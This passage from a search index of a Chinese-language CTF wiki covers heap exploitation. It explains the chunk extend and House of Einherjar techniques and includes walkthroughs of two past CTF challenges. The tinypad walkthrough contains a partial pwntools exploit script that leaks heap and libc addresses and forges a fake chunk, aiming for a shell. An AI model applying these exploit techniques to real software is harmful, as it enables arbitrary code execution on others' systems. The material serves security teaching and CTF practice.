            "text": "\u7a0b\u5e8f\u4e2d\u4e3b\u8981\u7684\u6f0f\u6d1e\u5728\u4e8e\u5806\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u4f46\u662f\u5982\u679c\u60f3\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u5fc5\u7136\u9700\u8981\u6ea2\u51fa\u5bf9\u5e94\u7684dest \u6570\u7ec4\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b   \u5229\u7528\u5806\u6ea2\u51fa\u8fdb\u884c chunk extend\uff0c\u4f7f\u5f97\u5728 submit \u4e2d  malloc(0x140uLL)  \u65f6\uff0c\u6070\u597d\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8ba2\u5355\u5904\u7684\u4f4d\u7f6e\u3002\u5728 submit \u4e4b\u524d\uff0c\u5e03\u7f6e\u597d\u5806\u5185\u5b58\u5e03\u5c40\uff0c\u4f7f\u5f97\u628a\u5b57\u7b26\u4e32\u62fc\u63a5\u540e\u6070\u597d\u53ef\u4ee5\u8986\u76d6 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3002  \u901a\u8fc7\u6784\u9020 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a\u4e00\u65b9\u9762\u6cc4\u6f0f __libc_start_main_ret \u7684\u5730\u5740\uff0c \u4e00\u65b9\u9762\u63a7\u5236\u7a0b\u5e8f\u91cd\u65b0\u8fd4\u56de\u6267\u884c \u3002\u8fd9\u65f6\uff0c\u4fbf\u53ef\u4ee5\u77e5\u9053 libc \u57fa\u5730\u5740\uff0csystem \u7b49\u5730\u5740\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u7531\u4e8e\u4e00\u65e6 submit \u4e4b\u540e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u76f4\u63a5\u9000\u51fa\uff0c\u6240\u4ee5\u6211\u4eec\u6bd4\u8f83\u597d\u7684\u601d\u8def\u5c31\u662f\u4fee\u6539 fini_array \u4e2d\u7684\u53d8\u91cf\uff0c\u4ee5\u4fbf\u4e8e\u8fbe\u5230\u7a0b\u5e8f\u6267\u884c\u5b8c\u6bd5\u540e\uff0c \u91cd\u65b0\u8fd4\u56de\u6211\u4eec\u671f\u5f85\u7684\u4f4d\u7f6e \u3002\u8fd9\u91cc\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e2atrick\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u8bfb\u53d6\u9009\u62e9\u7684\u65f6\u5019\u4f1a\u8bfb\u53d6 128 \u5927\u5c0f\uff0c\u5728\u6808\u4e0a\u3002\u800c\u7a0b\u5e8f\u6700\u540e\u5728\u8f93\u51fa dest \u7684\u65f6\u5019\uff0c\u4e4b\u524d\u6240\u8bfb\u53d6\u7684\u90a3\u90e8\u5206\u9009\u62e9\u5fc5\u7136\u662f\u5728\u6808\u4e0a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5982\u679c\u6211\u4eec\u5728\u6808\u4e0a\u9884\u5148\u5e03\u7f6e\u597d\u4e00\u4e9b\u63a7\u5236\u6d41\u6307\u9488\uff0c\u90a3\u5c31\u53ef\u4ee5\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002  \u518d\u6b21\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u8986\u76d6 free@got \u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u8fbe\u5230\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\u3002   \u8fd9\u91cc\uff0c\u5404\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u662f   Fini_array0 : 5+8=13  __libc_start_main_ret : 5+0x1a=31\u3002   00:0000\u2502 rsp  0x7ffe6a7f3ec8 \u2014\u25b8 0x400c93 \u25c2\u2014 mov    eax, 0\n01:0008\u2502      0x7ffe6a7f3ed0 \u25c2\u2014 0x100000000\n02:0010\u2502      0x7ffe6a7f3ed8 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ( Order 1: )\n03:0018\u2502      0x7ffe6a7f3ee0 \u2014\u25b8 0x400d38 \u25c2\u2014 pop    rcx\n04:0020\u2502      0x7ffe6a7f3ee8 \u2014\u25b8 0x9f2010 \u25c2\u2014 0x6666666666667325 ( %sffffff )\n05:0028\u2502      0x7ffe6a7f3ef0 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ( Order 1: )\n06:0030\u2502      0x7ffe6a7f3ef8 \u2014\u25b8 0x9f2130 \u25c2\u2014 0x6564724f203a3220 (  2: Orde )\n07:0038\u2502      0x7ffe6a7f3f00 \u25c2\u2014 0xa35 /*  5\\n  */\n08:0040\u2502      0x7ffe6a7f3f08 \u25c2\u2014 0x0\n... \u2193\n0b:0058\u2502      0x7ffe6a7f3f20 \u25c2\u2014 0xff00000000000000\n0c:0060\u2502      0x7ffe6a7f3f28 \u25c2\u2014 0x0\n... \u2193\n0f:0078\u2502      0x7ffe6a7f3f40 \u25c2\u2014 0x5f5f00656d697474 /*  ttime  */\n10:0080\u2502      0x7ffe6a7f3f48 \u25c2\u2014 0x7465675f6f736476 ( vdso_get )\n11:0088\u2502      0x7ffe6a7f3f50 \u25c2\u2014 0x1\n12:0090\u2502      0x7ffe6a7f3f58 \u2014\u25b8 0x400cfd \u25c2\u2014 add    rbx, 1\n13:0098\u2502      0x7ffe6a7f3f60 \u25c2\u2014 0x0\n... \u2193\n15:00a8\u2502      0x7ffe6a7f3f70 \u2014\u25b8 0x400cb0 \u25c2\u2014 push   r15\n16:00b0\u2502      0x7ffe6a7f3f78 \u2014\u25b8 0x400780 \u25c2\u2014 xor    ebp, ebp\n17:00b8\u2502      0x7ffe6a7f3f80 \u2014\u25b8 0x7ffe6a7f4070 \u25c2\u2014 0x1\n18:00c0\u2502      0x7ffe6a7f3f88 \u25c2\u2014 0xd8d379f22453ff00\n19:00c8\u2502 rbp  0x7ffe6a7f3f90 \u2014\u25b8 0x400cb0 \u25c2\u2014 push   r15\n1a:00d0\u2502      0x7ffe6a7f3f98 \u2014\u25b8 0x7f9db2113830 (__libc_start_main+240) \u25c2\u2014 mov    edi, eax  \uff01\uff01\uff01\u5f85\u8865\u5145\uff01\uff01\uff01", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#_9", 
            "text": "2016 Nuit du Hack CTF Quals : night deamonic heap", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/", 
            "text": "House Of Einherjar\n\n\n\u4ecb\u7ecd\n\n\nhouse of einherjar \u662f\u4e00\u79cd\u5806\u5229\u7528\u6280\u672f\uff0c\u7531 \nHiroki Matsukuma\n \u63d0\u51fa\u3002\u8be5\u5806\u5229\u7528\u6280\u672f\u53ef\u4ee5\u5f3a\u5236\u4f7f\u5f97 \nmalloc\n \u8fd4\u56de\u4e00\u4e2a\u51e0\u4e4e\u4efb\u610f\u5730\u5740\u7684 chunk \u3002\u5176\u4e3b\u8981\u5728\u4e8e\u6ee5\u7528 \nfree\n \u4e2d\u7684\u540e\u5411\u5408\u5e76\u64cd\u4f5c\uff08\u5408\u5e76\u4f4e\u5730\u5740\u7684chunk\uff09\uff0c\u4ece\u800c\u4f7f\u5f97\u5c3d\u53ef\u80fd\u907f\u514d\u788e\u7247\u5316\u3002\n\n\n\u6b64\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4e00\u4e9b\u7279\u6b8a\u5927\u5c0f\u7684\u5806\u5757\u4e2d\uff0coff by one \u4e0d\u4ec5\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size\uff0c\u8fd8\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 PREV_INUSE \u6bd4\u7279\u4f4d\u3002\n\n\n\u539f\u7406\n\n\n\u540e\u5411\u5408\u5e76\u64cd\u4f5c\n\n\nfree\n \u51fd\u6570\u4e2d\u7684\u540e\u5411\u5408\u5e76\u6838\u5fc3\u64cd\u4f5c\u5982\u4e0b\n\n\n        \n/* consolidate backward */\n\n        \nif\n \n(\n!\nprev_inuse\n(\np\n))\n \n{\n\n            \nprevsize\n \n=\n \nprev_size\n(\np\n);\n\n            \nsize\n \n+=\n \nprevsize\n;\n\n            \np\n \n=\n \nchunk_at_offset\n(\np\n,\n \n-\n((\nlong\n)\n \nprevsize\n));\n\n            \nunlink\n(\nav\n,\n \np\n,\n \nbck\n,\n \nfwd\n);\n\n        \n}\n\n\n\n\n\n\u8fd9\u91cc\u501f\u7528\u539f\u4f5c\u8005\u7684\u4e00\u5f20\u56fe\u7247\u8bf4\u660e\n\n\n\n\n\u5173\u4e8e\u6574\u4f53\u7684\u64cd\u4f5c\uff0c\u8bf7\u53c2\u8003 \n\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\n \u90a3\u4e00\u7ae0\u8282\u3002\n\n\n\u5229\u7528\u539f\u7406\n\n\n\u8fd9\u91cc\u6211\u4eec\u5c31\u4ecb\u7ecd\u8be5\u5229\u7528\u7684\u539f\u7406\u3002\u9996\u5148\uff0c\u5728\u4e4b\u524d\u7684\u5806\u7684\u4ecb\u7ecd\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ee5\u4e0b\u7684\u77e5\u8bc6\n\n\n\n\n\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk \u4f1a\u5171\u4eab \nprev_size\n\u5b57\u6bb5\uff0c\u5c24\u5176\u662f\u5f53\u4f4e\u5730\u5740\u7684 chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u9ad8\u5730\u5740\u7684chunk\u7684\u8be5\u5b57\u6bb5\u4fbf\u53ef\u4ee5\u88ab\u4f4e\u5730\u5740\u7684 chunk \u4f7f\u7528\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u6709\u5e0c\u671b\u53ef\u4ee5\u901a\u8fc7\u5199\u4f4e\u5730\u5740 chunk \u8986\u76d6\u9ad8\u5730\u5740 chunk \u7684 \nprev_size\n \u5b57\u6bb5\u3002\n\n\n\u4e00\u4e2a chunk PREV_INUSE \u4f4d\u6807\u8bb0\u4e86\u5176\u7269\u7406\u76f8\u90bb\u7684\u4f4e\u5730\u5740 chunk \u7684\u4f7f\u7528\u72b6\u6001\uff0c\u800c\u4e14\u8be5\u4f4d\u662f\u548c prev_size \u7269\u7406\u76f8\u90bb\u7684\u3002\n\n\n\u540e\u5411\u5408\u5e76\u65f6\uff0c\u65b0\u7684 chunk \u7684\u4f4d\u7f6e\u53d6\u51b3\u4e8e \nchunk_at_offset(p, -((long) prevsize))\n \u3002\n\n\n\n\n\u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u4e00\u4e2achunk prev_size \u4e0e PREV_INUSE \u5b57\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u65b0\u7684 chunk \u6307\u5411\u51e0\u4e4e\u4efb\u4f55\u4f4d\u7f6e\u3002\n\n\n\u5229\u7528\u8fc7\u7a0b\n\n\n\u6ea2\u51fa\u524d\n\n\n\u5047\u8bbe\u6ea2\u51fa\u524d\u7684\u72b6\u6001\u5982\u4e0b\n\n\n\n\n\u6ea2\u51fa\n\n\n\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe p0 \u5806\u5757\u4e00\u65b9\u9762\u53ef\u4ee5\u5199prev_size\u5b57\u6bb5\uff0c\u53e6\u4e00\u65b9\u9762\uff0c\u5b58\u5728off by one\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5199\u4e0b\u4e00\u4e2a chunk \u7684PREV_INUSE \u90e8\u5206\uff0c\u90a3\u4e48\n\n\n\n\n\u6ea2\u51fa\u540e\n\n\n\u5047\u8bbe\u6211\u4eec\u5c06 p1\u7684 prev_size \u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u76ee\u7684 chunk \u4f4d\u7f6e\u4e0ep1\u7684\u5dee\u503c\n\u3002\u5728\u6ea2\u51fa\u540e\uff0c\u6211\u4eec\u91ca\u653ep1\uff0c\u5219\u6211\u4eec\u6240\u5f97\u5230\u7684\u65b0\u7684 chunk \u7684\u4f4d\u7f6e \nchunk_at_offset(p1, -((long) prevsize))\n \u5c31\u662f\u6211\u4eec\u60f3\u8981\u7684 chunk \u4f4d\u7f6e\u4e86\u3002\n\n\n\u5f53\u7136\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u8fd9\u91cc\u4f1a\u5bf9\u65b0\u7684 chunk \u8fdb\u884c unlink \uff0c\u56e0\u6b64\u9700\u8981\u786e\u4fdd\u5728\u5bf9\u5e94 chunk \u4f4d\u7f6e\u6784\u9020\u597d\u4e86fake chunk \u4ee5\u4fbf\u4e8e\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002\n\n\n\n\n\u603b\u7ed3\n\n\n\u8fd9\u91cc\u6211\u4eec\u603b\u7ed3\u4e0b\u8fd9\u4e2a\u5229\u7528\u6280\u672f\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\n\n\n\n\n\u9700\u8981\u6709\u6ea2\u51fa\u6f0f\u6d1e\u53ef\u4ee5\u5199\u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740\u7684 prev_size \u4e0e PREV_INUSE \u90e8\u5206\u3002\n\n\n\u6211\u4eec\u9700\u8981\u8ba1\u7b97\u76ee\u7684 chunk \u4e0e p1 \u5730\u5740\u4e4b\u95f4\u7684\u5dee\uff0c\u6240\u4ee5\u9700\u8981\u6cc4\u6f0f\u5730\u5740\u3002\n\n\n\u6211\u4eec\u9700\u8981\u5728\u76ee\u7684 chunk \u9644\u8fd1\u6784\u9020\u76f8\u5e94\u7684 fake chunk\uff0c\u4ece\u800c\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002\n\n\n\n\n\u5176\u5b9e\uff0c\u8be5\u6280\u672f\u4e0e chunk extend/shrink \u6280\u672f\u6bd4\u8f83\u7c7b\u4f3c\u3002\n\n\n2016 Seccon tinypad\n\n\n\u57fa\u672c\u529f\u80fd\u5206\u6790\n\n\n\u9996\u5148\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ee5\u6765\u4e00\u4e2a\u6838\u5fc3\u7684\u8bfb\u53d6\u51fd\u6570\uff0c\u5373\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u8282\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u800c\uff0c\u5f53\u8bfb\u53d6\u7684\u957f\u5ea6\u6070\u597d\u4e3a\u6307\u5b9a\u7684\u957f\u5ea6\u65f6\uff0c\u4f1a\u51fa\u73b0 \noff by one \u7684\u6f0f\u6d1e\n\u3002\n\n\n\u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\uff0c\u6211\u4eec\u4e0d\u96be\u770b\u51fa\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f\u64cd\u4f5c\u4e00\u4e2a tinypad\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u64cd\u4f5c\n\n\n\n\n\u5f00\u5934\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u5f00\u5934\u4f9d\u6b21\u5224\u65ad\u6bcf\u4e2a memo \u7684\u6307\u9488\u6765\u5224\u65ad\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u8fdb\u800c\u5229\u7528 strlen \u6c42\u5f97\u5176\u76f8\u5e94\u7684\u957f\u5ea6\uff0c\u5c06 memo \u7684\u5185\u5bb9\u8f93\u51fa\u3002\u4ece\u8fd9\u91cc\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u51fa\u6700\u591a\u6709 4 \u4e2a memo\u3002\n\n\n\u6dfb\u52a0 memo\uff0c\u904d\u5386\u5b58\u50a8 memo \u7684\u53d8\u91cftinypad\uff0c\u6839\u636e tinypad \u7684\u5b58\u50a8\u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u4f7f\u7528\uff0c\u7136\u540e\u8fd8\u6709\u7684\u8bdd\uff0c\u5206\u914d\u4e00\u4e2a memo\u3002\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0c\u7a0b\u5e8f\u53ea\u662f\u4ece tinypad \u8d77\u59cb\u504f\u79fb16*16=256 \u5904\u624d\u5f00\u59cb\u4f7f\u7528\uff0c\u6bcf\u4e2a memo \u5b58\u50a8\u4e24\u4e2a\u5b57\u6bb5\uff0c\u4e00\u4e2a\u662f\u8be5 memo \u7684\u5927\u5c0f\uff0c\u53e6\u4e00\u4e2a\u662f\u8be5 memo \u5bf9\u5e94\u7684\u6307\u9488\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7ed3\u6784\u4f53\uff0c\u5e76\u4fee\u6539 ida \u8bc6\u522b\u7684 tinypad\uff0c\u4f7f\u4e4b\u66f4\u52a0\u53ef\u8bfb\uff08\u4f46\u662f\u5176\u5b9e ida \u6ca1\u6709\u529e\u6cd5\u5e2e\u5fd9\u667a\u80fd\u8bc6\u522b\u3002\uff09\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u8be5\u6dfb\u52a0\u529f\u80fd\u4f9d\u8d56\u4e8e\u8bfb\u53d6\u51fd\u6570\uff0c\u6240\u4ee5\u5b58\u5728 off by one \u7684\u6f0f\u6d1e\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u7528\u6237\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u6700\u5927\u4e3a 256 \u5b57\u8282\uff0c\u548c tinypad \u524d\u9762\u7684\u672a\u4f7f\u7528\u7684 256 \u5b57\u8282\u6070\u597d\u4e00\u81f4\u3002\n\n\n\u5220\u9664\uff0c\u6839\u636e\u5b58\u50a8 memo \u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u88ab\u4f7f\u7528\uff0c\u540c\u65f6\u5c06\u76f8\u5e94 memo \u5927\u5c0f\u8bbe\u7f6e\u4e3a0\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u6307\u9488\u8bbe\u7f6e\u4e3a NULL\uff0c\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4 Use After Free\u3002\n\u5373\u5728\u7a0b\u5e8f\u5f00\u5934\u65f6\uff0c\u5c31\u6709\u53ef\u80fd\u8f93\u51fa\u4e00\u4e9b\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u6cc4\u6f0f\u4e00\u4e9b\u57fa\u5730\u5740\u7684\u57fa\u7840\n\u3002\n\n\n\u7f16\u8f91\u3002\u5728\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u6839\u636e\u4e4b\u524d\u5b58\u50a8\u7684 memo \u7684\u5185\u5bb9\u5c06\u5176\u62f7\u8d1d\u5230 tinypad \u7684\u524d 256 \u4e2a\u5b57\u8282\u4e2d\uff0c\u4f46\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684\uff0c\u5f53 memo \u5b58\u50a8\u4e86 256 \u4e2a\u5b57\u8282\u65f6\uff0c\u5c31\u4f1a\u5b58\u5728 off by one\u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7a0b\u5e8f\u5229\u7528 strlen \u5224\u65ad\u590d\u5236\u4e4b\u540e\u7684 tinypad \u7684\u5185\u5bb9\u957f\u5ea6\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002\u4e4b\u540e\u7a0b\u5e8f\u7ee7\u7eed\u5229\u7528 strlen \u6c42\u5f97 memo \u7684\u957f\u5ea6\uff0c\u5e76\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u5230 tinypad \u4e2d\uff0c\u6839\u636e\u8bfb\u53d6\u51fd\u6570\uff0c\u8fd9\u91cc\u5fc5\u7136\u51fa\u73b0\u4e86 \n\\x00\n\u3002\u6700\u540e\u7a0b\u5e8f\u5c06\u8bfb\u53d6\u5230 tinypad \u524d 256 \u5b57\u8282\u7684\u5185\u5bb9\u653e\u5230\u5bf9\u5e94 memo \u4e2d\u3002\n\n\n\u9000\u51fa\n\n\n\n\n\u5229\u7528\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528\u5220\u9664\u65f6\u6ca1\u6709\u5c06\u6307\u9488\u7f6e\u4e3aNULL\u7684 UAF \u6f0f\u6d1e\uff0c\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740\n\n\n\u518d\u6b21\u5229\u7528 UAF \u6f0f\u6d1e\u6cc4\u6f0f libc \u7684\u57fa\u5730\u5740\u3002\n\n\n\u5229\u7528 house of einherjar \u65b9\u6cd5\u5728 tinypad \u7684\u524d 256 \u5b57\u8282\u4e2d\u4f2a\u9020 chunk\u3002\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u65f6\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u63a7\u52364\u4e2a memo \u7684\u6307\u9488\u548c\u5185\u5bb9\u4e86\u3002\n\n\n\u8fd9\u91cc\u867d\u7136\u6211\u4eec\u7684\u7b2c\u4e00\u60f3\u6cd5\u53ef\u80fd\u662f\u76f4\u63a5\u8986\u76d6 malloc_hook \u4e3a one_gadget \u5730\u5740\uff0c\u4f46\u662f\uff0c\u7531\u4e8e\u5f53\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u662f\u5229\u7528 strlen \u6765\u5224\u8bfb\u53ef\u4ee5\u8bfb\u53d6\u591a\u5c11\u957f\u5ea6\uff0c\u800c malloc_hook \u5219\u5728\u521d\u59cb\u65f6\u4e3a 0\u3002\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8986\u76d6\uff0c\u6240\u4ee5\u8fd9\u91cc\u91c7\u7528\u5176\u4ed6\u65b9\u6cd5\uff0c\u5373\u4fee\u6539\u7a0b\u5e8f\u7684 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget\uff0c\u4e4b\u6240\u4ee5\u53ef\u4ee5\u884c\u5f97\u901a\uff0c\u662f\u56e0\u4e3a\u8fd4\u56de\u5730\u5740\u5f80\u5f80\u662f 7f \u5f00\u5934\u7684\uff0c\u957f\u5ea6\u8db3\u591f\u957f\uff0c\u53ef\u4ee5\u8986\u76d6\u4e3aone_gadget\u3002\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u9700\u8981\u6cc4\u6f0f main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u7531\u4e8e libc \u4e2d\u5b58\u50a8\u4e86 main \u51fd\u6570 environ \u6307\u9488\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5148\u6cc4\u9732\u51faenviron \u7684\u5730\u5740\uff0c\u7136\u540e\u5728\u5f97\u77e5\u5b58\u50a8 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002\u8fd9\u91cc\u9009\u53d6 environ \u7b26\u53f7\u662f\u56e0\u4e3a environ \u7b26\u53f7\u5728 libc \u4e2d\u4f1a\u5bfc\u51fa\uff0c\u800c\u50cf argc \u548c argv \u5219\u4e0d\u4f1a\u5bfc\u51fa\uff0c\u76f8\u5bf9\u6765\u8bf4\u4f1a\u6bd4\u8f83\u9ebb\u70e6\u4e00\u70b9\u3002\n\n\n\u6700\u540e\u4fee\u6539 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget \u5730\u5740\u83b7\u53d6shell\u3002\n\n\n\n\n\u5177\u4f53\u5229\u7528\u811a\u672c\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nterminal\n \n=\n \n[\ngnome-terminal\n,\n \n-x\n,\n \nsh\n,\n \n-c\n]\n\n\nif\n \nargs\n[\nDEBUG\n]:\n\n    \ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\ntinypad\n \n=\n \nELF\n(\n./tinypad\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n    \nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\nelse\n:\n\n    \np\n \n=\n \nprocess\n(\n./tinypad\n)\n\n    \nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n    \nmain_arena_offset\n \n=\n \n0x3c4b20\n\n\nlog\n.\ninfo\n(\nPID: \n \n+\n \nstr\n(\nproc\n.\npidof\n(\np\n)[\n0\n]))\n\n\n\n\ndef\n \nadd\n(\nsize\n,\n \ncontent\n):\n\n    \np\n.\nrecvuntil\n(\n(CMD)\n \n)\n\n    \np\n.\nsendline\n(\na\n)\n\n    \np\n.\nrecvuntil\n(\n(SIZE)\n \n)\n\n    \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \np\n.\nrecvuntil\n(\n(CONTENT)\n \n)\n\n    \np\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nedit\n(\nidx\n,\n \ncontent\n):\n\n    \np\n.\nrecvuntil\n(\n(CMD)\n \n)\n\n    \np\n.\nsendline\n(\ne\n)\n\n    \np\n.\nrecvuntil\n(\n(INDEX)\n \n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \np\n.\nrecvuntil\n(\n(CONTENT)\n \n)\n\n    \np\n.\nsendline\n(\ncontent\n)\n\n    \np\n.\nrecvuntil\n(\nIs it OK?\n\\n\n)\n\n    \np\n.\nsendline\n(\nY\n)\n\n\n\n\ndef\n \ndelete\n(\nidx\n):\n\n    \np\n.\nrecvuntil\n(\n(CMD)\n \n)\n\n    \np\n.\nsendline\n(\nd\n)\n\n    \np\n.\nrecvuntil\n(\n(INDEX)\n \n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ndef\n \nrun\n():\n\n    \np\n.\nrecvuntil\n(\n\n        \n  ============================================================================\n\\n\\n\n\n    \n)\n\n    \n# 1. leak heap base\n\n    \nadd\n(\n0x70\n,\n \na\n \n*\n \n8\n)\n  \n# idx 0\n\n    \nadd\n(\n0x70\n,\n \nb\n \n*\n \n8\n)\n  \n# idx 1\n\n    \nadd\n(\n0x100\n,\n \nc\n \n*\n \n8\n)\n  \n# idx 2\n\n\n    \ndelete\n(\n2\n)\n  \n# delete idx 1\n\n    \ndelete\n(\n1\n)\n  \n# delete idx 0, idx 0 point to idx 1\n\n    \np\n.\nrecvuntil\n(\n # CONTENT: \n)\n\n    \ndata\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n  \n# get pointer point to idx1\n\n    \nheap_base\n \n=\n \nu64\n(\ndata\n.\nljust\n(\n8\n,\n \n\\x00\n))\n \n-\n \n0x80\n\n    \nlog\n.\nsuccess\n(\nget heap base: \n \n+\n \nhex\n(\nheap_base\n))\n\n\n    \n# 2. leak libc base\n\n    \n# this will trigger malloc_consolidate\n\n    \n# first idx0 will go to unsorted bin\n\n    \n# second idx1 will merge with idx0(unlink), and point to idx0\n\n    \n# third idx1 will merge into top chunk\n\n    \n# but cause unlink feture, the idx0\ns fd and bk won\nt change\n\n    \n# so idx0 will leak the unsorted bin addr\n\n    \ndelete\n(\n3\n)\n\n    \np\n.\nrecvuntil\n(\n # CONTENT: \n)\n\n    \ndata\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n    \nunsorted_offset_arena\n \n=\n \n8\n \n+\n \n10\n \n*\n \n8\n\n    \nmain_arena\n \n=\n \nu64\n(\ndata\n.\nljust\n(\n8\n,\n \n\\x00\n))\n \n-\n \nunsorted_offset_arena\n\n    \nlibc_base\n \n=\n \nmain_arena\n \n-\n \nmain_arena_offset\n\n    \nlog\n.\nsuccess\n(\nmain arena addr: \n \n+\n \nhex\n(\nmain_arena\n))\n\n    \nlog\n.\nsuccess\n(\nlibc base addr: \n \n+\n \nhex\n(\nlibc_base\n))\n\n\n    \n# 3. house of einherjar\n\n    \nadd\n(\n0x18\n,\n \na\n \n*\n \n0x18\n)\n  \n# idx 0\n\n    \n# we would like trigger house of einherjar at idx 1\n\n    \nadd\n(\n0x100\n,\n \nb\n \n*\n \n0xf8\n \n+\n \n\\x11\n)\n  \n# idx 1\n\n    \nadd\n(\n0x100\n,\n \nc\n \n*\n \n0xf8\n)\n  \n# idx 2\n\n    \nadd\n(\n0x100\n,\n \nd\n \n*\n \n0xf8\n)\n  \n#idx 3\n\n\n    \n# create a fake chunk in tinypad\ns 0x100 buffer, offset 0x20\n\n    \ntinypad_addr\n \n=\n \n0x602040\n\n    \nfakechunk_addr\n \n=\n \ntinypad_addr\n \n+\n \n0x20\n\n    \nfakechunk_size\n \n=\n \n0x101\n\n    \nfakechunk\n \n=\n 